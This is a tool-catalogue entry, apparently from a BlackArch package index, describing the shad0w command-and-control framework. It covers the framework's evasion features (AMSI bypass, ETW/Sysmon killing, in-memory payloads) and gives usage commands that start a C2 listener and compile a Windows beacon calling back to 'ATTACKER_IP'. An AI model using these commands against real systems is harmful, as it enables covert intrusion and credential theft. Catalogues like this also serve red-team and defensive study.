---
name: "shad0w"
categories:
  - blackarch-windows
version: "387.d35b9dc"
homepage: "https://github.com/bats3c/shad0w"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: windows
license: MIT
meta-checked: "2026-11-09"
github-repo: "bats3c/shad0w"
github-stars: 2176
github-pushed: "2021-09-29"
github-archived: false
github-issues: 10
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# shad0w

> Modular HTTPS C2 framework with EDR-aware beacons that execute .NET, PE and script payloads fully in memory.

## What it's for

SHAD0W (by BatSec, `bats3c`) is a modular command-and-control framework
"designed to successfully operate on mature environments". The server is
Python 3 (Docker-friendly, prompt-toolkit console) speaking a JSON
protocol over HTTPS; beacons are C with dynamically resolved syscalls,
anti-DLL-injection checks and Microsoft process-mitigation options, and
use Donut to execute .NET assemblies, EXEs, DLLs, JS, VBS or XSL fully
in memory. Once beacons check in, the interactive console tasks them
through modules — Mimikatz, GhostPack and SharpCollection .NET tools,
elevation exploits, an ETW/Sysmon killer ("Ghost in the Logs"),
SharpSocks reverse SOCKS over HTTPS, unmanaged PowerShell with an AMSI
bypass, and file upload/download. The server can also mirror a real
website in real time so the C2 endpoint looks like an ordinary site in a
browser. Development stopped in 2021; it is beta-quality but remains a
compact reference for EDR-evasion C2 design. BlackArch wraps it as the
`shad0w` command (`/usr/share/shad0w`).

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Start the C2 listener

Bring up the HTTPS server beacons will call home to.

```
shad0w listen -p 443 -c certs/cert.pem -k certs/key.pem
```

Outcome: binds HTTPS on port 443 with the given certificate and drops
into the interactive console; `-m https://example.com` additionally
mirrors that site for non-beacon visitors and `-e ATTACKER_IP` sets the
endpoint modules call back to.

### Compile a beacon

Build the implant with the desired architecture and hardening.

```
shad0w beacon -p x64/windows/secure -H ATTACKER_IP -P 443 -f exe -o beacon.exe
```

Outcome: compiles a beacon that connects to `ATTACKER_IP:443`, written to
`beacon.exe`; payload strings are `arch/platform/secure` (secure uses
indirect syscalls/ntdll hooking defenses — the `static` variant is
simpler but larger and easier to detect) and `-f` accepts `raw`, `exe`,
`psh` or `dll`.

### Update the framework

Pull the latest beacon payloads and modules.

```
shad0w update
```

Outcome: fetches the upstream changes into the local install; run it
after deploying so newly compiled beacons match the running server
version.
